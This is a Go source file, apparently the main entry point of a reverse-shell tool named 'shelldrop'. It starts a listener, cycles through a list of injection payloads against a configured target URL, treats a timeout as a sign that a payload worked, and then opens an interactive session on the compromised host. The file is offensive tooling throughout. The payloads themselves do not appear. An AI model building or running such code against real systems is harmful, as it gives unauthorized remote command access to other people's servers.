package main

import (
	"context"
	"errors"
	"os"
	"shelldrop/log"
	"shelldrop/payloads"
)

func main() {
	cfg := ParseConfig()
	ctx, cancel := context.WithCancel(context.Background())

	listener := NewListener(cfg.Listener, cancel)
	listener.Start()
	defer listener.Close()

	if injectPayloads(cfg, ctx) {
		listener.Interact()
	} else {
		log.Fatal("No working payloads found.")
	}
}

func injectPayloads(cfg *Config, ctx context.Context) bool {
	if cfg.Payload != "" {
		if injectPayload(cfg.Payload, cfg, ctx) {
			return true
		}
	}

	for _, payload := range payloads.GetNames() {
		if injectPayload(payload, cfg, ctx) {
			return true
		}
	}

	return false
}

func injectPayload(payload string, cfg *Config, ctx context.Context) bool {
	injector := NewInjector(payload).
		WithListenerConfig(cfg.Listener).
		WithUrl(cfg.Request.Url)

	if err := injector.Do(ctx); err != nil {
		if os.IsTimeout(err) || errors.Is(err, context.Canceled) {
			log.Infof("Found successful payload: %s", payload)
			return true
		}

		log.Fatalf("Failed to inject payload: %v", err)
	}

	return false
}
